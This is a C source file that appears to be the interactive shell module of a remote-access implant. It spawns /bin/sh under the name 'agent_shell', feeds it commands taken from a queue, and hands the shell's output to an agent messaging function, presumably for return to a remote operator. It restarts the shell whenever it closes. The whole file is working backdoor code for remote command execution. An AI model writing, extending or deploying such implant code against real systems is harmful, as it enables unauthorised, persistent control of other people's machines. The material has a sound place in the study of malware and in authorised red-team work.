#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>

#include "queue.h"
#include "implant.h"
#include "agent_handler.h"
#include "shell.h"

#define PIPE_OUT	0
#define PIPE_IN		1

// Globals
extern Queue* shell_receive_queue;
extern pthread_mutex_t shell_receive_queue_lock;
extern Queue* shell_send_queue;
extern pthread_mutex_t shell_send_queue_lock;
// SIGINT flag
extern volatile sig_atomic_t agent_close_flag;
// Connected flag
extern volatile sig_atomic_t agent_disconnect_flag;

typedef struct Pipes{
	int pipefd[2];
} Pipes;

typedef struct Shell_Pipes{
	Pipes pipes[3];
} Shell_Pipes;

static int execute_shell(){
	pid_t pid;
	Shell_Pipes shell_pipes = {0};
	Queue_Message* message;
	int nbytes = 0;
	char buf[PAYLOAD_SIZE];
	char* buffer;
	int ret_val = RET_OK;
	
	for (int i = 0; i < 3; i++){
		if (pipe(shell_pipes.pipes[i].pipefd) == -1){
			printf("ERROR pipe failed: %d\n", errno);
			return RET_FATAL_ERROR;
		}
	}
	
	// we don't want to block on read for STDOUT PIPE_OUT and STDERR PIPE_OUT
	if (fcntl(shell_pipes.pipes[STDOUT].pipefd[PIPE_OUT], F_SETFL, O_NONBLOCK) < 0){
		printf("ERROR nonblocking pipe option failed\n");
		return RET_FATAL_ERROR;
	}
	if (fcntl(shell_pipes.pipes[STDERR].pipefd[PIPE_OUT], F_SETFL, O_NONBLOCK) < 0){
		printf("ERROR nonblocking pipe option failed\n");
		return RET_FATAL_ERROR;
	}
		
	pid = fork();
	
	if (pid < 0){
		printf("ERROR fork failed\n");
	}
	else if (pid == 0){		// child
		close(shell_pipes.pipes[STDIN].pipefd[PIPE_IN]);					// close input of STDIN (not writing to STDIN)
		dup2(shell_pipes.pipes[STDIN].pipefd[PIPE_OUT], STDIN_FILENO);		// dup output of STDIN to shell STDIN
		
		close(shell_pipes.pipes[STDOUT].pipefd[PIPE_OUT]);					// close output of STDOUT (not reading from STDOUT)
		dup2(shell_pipes.pipes[STDOUT].pipefd[PIPE_IN], STDOUT_FILENO);		// dup input of STDOUT to shell STDOUT
		
		close(shell_pipes.pipes[STDERR].pipefd[PIPE_OUT]);					// close output of STDERR (not reading from STDERR)
		dup2(shell_pipes.pipes[STDERR].pipefd[PIPE_IN], STDERR_FILENO);		// dup input of STDERR to shell STDERR
		
		// Execute shell
		debug_print("%s\n", "shell starting");
		char * const argv[] = {"agent_shell", NULL};
		execve("/bin/sh", argv, NULL);
		
		// If shell closes, end this process so parent can respawn
		close(shell_pipes.pipes[STDIN].pipefd[PIPE_OUT]);					// close output of STDIN
		close(shell_pipes.pipes[STDOUT].pipefd[PIPE_IN]);					// close input of STDOUT
		close(shell_pipes.pipes[STDERR].pipefd[PIPE_IN]);					// close input of STDERR
		exit(RET_OK);
		
	}
	else {					// parent
		close(shell_pipes.pipes[STDIN].pipefd[PIPE_OUT]);					// close output of STDIN (not reading from STDIN)
		close(shell_pipes.pipes[STDOUT].pipefd[PIPE_IN]);					// close input of STDOUT (not writing to STDOUT)
		close(shell_pipes.pipes[STDERR].pipefd[PIPE_IN]);					// close input of STDERR (not writing to STDERR)
		
		// check if child is still running
		// if still running, dequeue messages and send to shell
		// if child was killed, we need to start another child process
		while (!(waitpid(pid, NULL, WNOHANG)) && !agent_close_flag && !agent_disconnect_flag){

			pthread_mutex_lock(&shell_send_queue_lock);
			message = dequeue(shell_send_queue);
			pthread_mutex_unlock(&shell_send_queue_lock);

			if (message){
				debug_print("dequeued message for shell: %s, %d\n", message->buffer, message->size);
				if ((nbytes = write(shell_pipes.pipes[STDIN].pipefd[PIPE_IN], message->buffer, message->size)) == -1){
					printf("ERROR write to shell\n");
					ret_val =  RET_FATAL_ERROR;
					break;
				}
				
				free(message->buffer);
				free(message);
			}
			
			// Read from STDOUT
			memset(buf, 0, PAYLOAD_SIZE);
			nbytes = read(shell_pipes.pipes[STDOUT].pipefd[PIPE_OUT], buf, PAYLOAD_SIZE - 1);
			if (nbytes == -1){
				if (errno != EAGAIN){				// EAGAIN means pipe is empty and no error
					printf("ERROR STDOUT read from shell: %d\n", errno);
					ret_val =  RET_FATAL_ERROR;
					break;
				}
			}
			else if (nbytes == 0){					// shell is closed?
				break;
			}
			else{
				if ((buffer = malloc(nbytes)) == NULL){
					agent_close_flag = true;
					break;
				}
				memcpy(buffer, buf, nbytes);
				
				debug_print("got command response: %s\n", buffer);
				
				agent_prepare_message(TYPE_COMMAND, buffer, nbytes);
			}
			
			// Read from STDERR
			memset(buf, 0, PAYLOAD_SIZE);
			nbytes = read(shell_pipes.pipes[STDERR].pipefd[PIPE_OUT], buf, PAYLOAD_SIZE - 1);
			if (nbytes == -1){
				if (errno != EAGAIN){				// EAGAIN means pipe is empty and no error
					printf("ERROR STDERR read from shell: %d\n", errno);
					ret_val =  RET_FATAL_ERROR;
					break;
				}
			}
			else if (nbytes == 0){					// shell is closed?
				break;
			}
			else{
				printf("DEBUG STDERR: %s\n", buf);
			}
		}
		
		close(shell_pipes.pipes[STDIN].pipefd[PIPE_IN]);							// close input of STDIN
		close(shell_pipes.pipes[STDOUT].pipefd[PIPE_OUT]);							// close output of STDOUT
		close(shell_pipes.pipes[STDERR].pipefd[PIPE_OUT]);							// close output of STDERR
	}
	
	debug_print("%s\n", "shell closed");
	return ret_val;
}

void *shell_thread(void *vargp){
	int ret_val;

	debug_print("%s\n", "starting shell thread");
	
	while (!agent_close_flag && !agent_disconnect_flag){
		if ((ret_val = execute_shell()) != RET_OK){
			printf("ERROR execute shell\n");
			exit(RET_FATAL_ERROR);
		}
	}

	debug_print("%s\n", "shell thread done");
	
	return 0;
}